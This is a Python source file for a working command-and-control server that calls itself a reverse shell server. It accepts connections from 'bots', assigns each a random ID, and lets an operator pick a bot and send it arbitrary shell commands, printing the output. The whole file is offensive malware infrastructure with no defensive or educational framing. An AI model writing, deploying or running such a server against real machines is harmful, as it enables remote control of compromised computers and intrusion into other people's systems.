from socket import *
import threading
import argparse
from termcolor import colored
import os
import sys
import random

LINE_CLEAR = "\x1b[2K"
default_port = 38433


class C2Server:
    def __init__(self, server_port=default_port):
        self.server_port = server_port
        self.server_socket = None
        self.bot_lookup = {}
        self.bot_details = {}
        self.active_bot = None

    def start_server(self):
        self.server_socket = socket(AF_INET, SOCK_STREAM)
        self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.server_socket.bind(("", self.server_port))
        self.server_socket.listen(3)
        print(
            colored(
                f"[+] Reverse shell server waiting for connections on port {self.server_port}",
                "yellow",
                "on_grey",
                ["bold"],
            ),
            end="\n",
        )

    def handle_client(self, connection_socket, addr):
        print(
            colored(
                f"\nBot at {addr} reporting for duty", "cyan", "on_grey", ["bold"]
            ),
            end="\n",
        )

        command = ""

        while command.lower() != "exit":
            if self.active_bot:
                command = input(
                    colored("Enter a command: ", "magenta", "on_grey", ["bold"])
                )
            else:
                print(
                    colored(
                        f"Select a bot to initiate command",
                        "magenta",
                        "on_grey",
                        ["bold"],
                    )
                )
                self.select_bot()
                continue

            if command.lower() == "select_bot":
                self.select_bot()
                continue

            if command.strip() == "":
                print(
                    colored(
                        f"[!] Empty command",
                        "yellow",
                        "on_grey",
                        ["bold"],
                    ),
                    end="\n",
                )
                continue

            if command.lower().strip() == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue

            self.active_bot.send(command.encode())
            message = self.active_bot.recv(4048).decode()
            print(message)

        self.shutdown_server()

    def close_connection(self, connection_socket):
        connection_socket.shutdown(SHUT_RDWR)
        connection_socket.close()

    def select_bot(self):
        cancel_text = colored("0", "yellow")
        bot_count = len(self.bot_lookup)
        if bot_count == 0:
            print(colored("No bots connected.", "red"))
            return

        print(colored("Select a bot:", "cyan"))
        for bot_id, connection_socket in self.bot_details.items():
            print(colored(f"Bot {bot_id}: {connection_socket}", "cyan"))

        while True:
            try:
                choice = int(
                    input(
                        f"Enter the bot ID to activate a bot or {cancel_text} to cancel selection: "
                    )
                )
                if choice == 0:
                    print(colored("Bot selection cancelled.", "cyan"))
                    return
                elif choice not in self.bot_lookup.keys():
                    print(colored("Invalid choice. Try again.", "red"))
                elif choice in self.bot_lookup.keys() and choice in self.bot_details:
                    self.active_bot = self.bot_lookup[choice]
                    print(colored(f"Active bot set to Bot ID: {choice}", "green"))
                    return
            except ValueError:
                print(colored("Invalid choice. Try again.", "red"))

    def shutdown_server(self):
        print(colored("\n[+] Shutting down server.", "red", "on_grey", ["bold"]))
        for bot_id, connection_socket in self.bot_lookup.items():
            print(
                colored(
                    f"\n[+] Shutting down the bot connection {bot_id} at {self.bot_details[bot_id]}...",
                    "yellow",
                    "on_grey",
                    ["bold"],
                )
            )
            self.close_connection(connection_socket)

        self.server_socket.close()

    def run(self):
        self.start_server()
        try:
            while True:
                connection_socket, addr = self.server_socket.accept()
                bot_id = random.randint(1, 30000)
                self.bot_details[bot_id] = addr
                self.bot_lookup[bot_id] = connection_socket
                client_thread = threading.Thread(
                    target=self.handle_client, args=(connection_socket, addr)
                )
                client_thread.start()
        except KeyboardInterrupt:
            self.shutdown_server()


def main():
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument(
        "-p", "--port", type=int, default=default_port, help="Port number"
    )
    args = parser.parse_args()

    c2_server = C2Server(args.port)
    try:
        c2_server.run()
    except BrokenPipeError:
        print(colored("Exiting...", "red", "on_grey", ["bold"]))
        sys.exit(1)
    except KeyboardInterrupt:
        # handle a Keyboard Interrupt (Ctrl+C)
        print("Keyboard Interrupt. Closing Bot Client...")
        sys.exit(1)


if __name__ == "__main__":
    main()
